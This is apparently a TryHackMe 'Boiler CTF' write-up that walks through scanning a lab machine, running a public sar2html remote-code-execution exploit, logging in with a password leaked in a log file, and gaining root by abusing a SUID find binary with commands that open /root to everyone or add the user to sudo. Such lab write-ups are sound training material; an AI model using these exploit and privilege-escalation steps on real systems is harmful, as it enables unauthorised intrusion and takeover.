# Boiler_CTF
TryHackMe Boiler CTF Writeup

Link to the room https://tryhackme.com/room/boilerctf2

## Lets go

export IP=10.10.2.93

## Enumeration

```
nmap -p21,80,10000,55007 -sV -sC -T4 -Pn -oA 10.10.2.93 10.10.2.93
```
nmap results

```
21/tcp    open  ftp     vsftpd 3.0.3 (Anonymous FTP login allowed)
80/tcp    open  http    Apache httpd 2.4.18 (http-robots.txt)
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 
```
Robots.txt

```
/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```
## Task 1a

Connecting to ftp server using anonymous. 
Running command ls -la

```
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
```

## Task 1b

```
ssh
```

## Task 1c

```
webmin
```

## Task 1d

After extensibly searching the service on exploit-db, google and referring back to nmap results. No exploit found.

```
nay
```

## Task 1e

Firing up gobuster to do an extensive scan of the webserver running.

```
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php 
```
Results

```
/manual               (Status: 301) [Size: 309] [--> http://10.10.2.93/manual/]
/joomla               (Status: 301) [Size: 309] [--> http://10.10.2.93/joomla/]
```
## Keep enumerating 

Running a second scan on /joomla/ directory, using the common.txt wordlist this time as results were inconclusive using the previous list.

```
gobuster dir -u http://$IP/joomla/ -w /usr/share/wordlists/dirb/common.txt -x php 
```

Results

```
/.hta.php             (Status: 403) [Size: 300]
/.hta                 (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 301]
/.htaccess.php        (Status: 403) [Size: 305]
/.htpasswd.php        (Status: 403) [Size: 305]
/_archive             (Status: 301) [Size: 318] [--> http://10.10.2.93/joomla/_archive/]
/_database            (Status: 301) [Size: 319] [--> http://10.10.2.93/joomla/_database/]
/_files               (Status: 301) [Size: 316] [--> http://10.10.2.93/joomla/_files/]   
/_test                (Status: 301) [Size: 315] [--> http://10.10.2.93/joomla/_test/]    
/~www                 (Status: 301) [Size: 314] [--> http://10.10.2.93/joomla/~www/]     
/administrator        (Status: 301) [Size: 323] [--> http://10.10.2.93/joomla/administrator/]
/bin                  (Status: 301) [Size: 313] [--> http://10.10.2.93/joomla/bin/]          
/build                (Status: 301) [Size: 315] [--> http://10.10.2.93/joomla/build/]        
/cache                (Status: 301) [Size: 315] [--> http://10.10.2.93/joomla/cache/]        
/components           (Status: 301) [Size: 320] [--> http://10.10.2.93/joomla/components/]   
/configuration.php    (Status: 200) [Size: 0]                                                
/images               (Status: 301) [Size: 316] [--> http://10.10.2.93/joomla/images/]       
/includes             (Status: 301) [Size: 318] [--> http://10.10.2.93/joomla/includes/]     
/index.php            (Status: 200) [Size: 12474]                                            
/index.php            (Status: 200) [Size: 12474]                                            
/installation         (Status: 301) [Size: 322] [--> http://10.10.2.93/joomla/installation/] 
/language             (Status: 301) [Size: 318] [--> http://10.10.2.93/joomla/language/]     
/layouts              (Status: 301) [Size: 317] [--> http://10.10.2.93/joomla/layouts/]      
/libraries            (Status: 301) [Size: 319] [--> http://10.10.2.93/joomla/libraries/]    
/media                (Status: 301) [Size: 315] [--> http://10.10.2.93/joomla/media/]        
/modules              (Status: 301) [Size: 317] [--> http://10.10.2.93/joomla/modules/]      
/plugins              (Status: 301) [Size: 317] [--> http://10.10.2.93/joomla/plugins/]  
/templates            (Status: 301) [Size: 319] [--> http://10.10.2.93/joomla/templates/]    
/tests                (Status: 301) [Size: 315] [--> http://10.10.2.93/joomla/tests/]        
/tmp                  (Status: 301) [Size: 313] [--> http://10.10.2.93/joomla/tmp/] 
```
After a painstaking process of going through each of the directories, /_ test/ leads to page with sar2html
A quick search on exploit_db results in Exploit Title: sar2html 3.2.1 - 'plot' Remote Code Execution.
Saving the exploit and running it:

```
python3 sar2html.py 
Enter The url => http://10.10.2.93/joomla/_test/
Command => ls
HPUX
Linux
SunOS
index.php
log.txt
sar2html
sarFILE
```

## Task 1f

```
log.txt
```

## Task 2

```
Command => cat log.txt
HPUX
Linux
SunOS
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```
SSH into the machine using basterd:**********

```
ssh basterd@$IP -p 55007
```
## Task 2a

```
backup
```

```
cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#*****************

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

## Switching user
stoner:*****************

```
su stoner
```
## Task 2b

```
stoner@Vulnerable:~$ ls -la
total 520
drwxr-x--- 6 stoner stoner   4096 Apr 29 08:00 .
drwxr-xr-x 4 root   root     4096 Aug 22  2019 ..
drwx------ 2 stoner stoner   4096 Apr 29 07:57 .cache
drwxr-x--- 3 stoner stoner   4096 Apr 29 07:58 .config
drwx------ 2 stoner stoner   4096 Apr 29 07:59 .gnupg
drwxrwxr-x 2 stoner stoner   4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner     34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

## Finding exploit

Sending linPEAS through scp

```
scp -P 55007 /opt/scripts/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh stoner@$IP:/home/stoner
```
## Running linpeas

```
stoner@Vulnerable:~$ ls
linpeas.sh
stoner@Vulnerable:~$ chmod +x linpeas.sh
stoner@Vulnerable:~$ ./linpeas.sh
```
### Interesting Files

```
[+] SUID - Check easy privesc, exploits and write perms                                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                 
-rwsr-xr-x 1 root   root        43K May  7  2014 /bin/ping6                                                                                                                                   
-rwsr-xr-x 1 root   root        39K May  7  2014 /bin/ping
-rwsr-sr-x 1 daemon daemon      50K Jan 15  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-r-sr-xr-x 1 root   root       227K Feb  8  2016 /usr/bin/find
```

## Task 2c

```
find 
```

## Exploiting vunerability

```
/usr/bin/find . -exec chmod -R 777 /root \;
```
Or

```
/usr/bin/find . -exec usermod -aG sudo stoner \;
```
Now that the /root folder is accessible by all, simply cd in /root and read the flag.
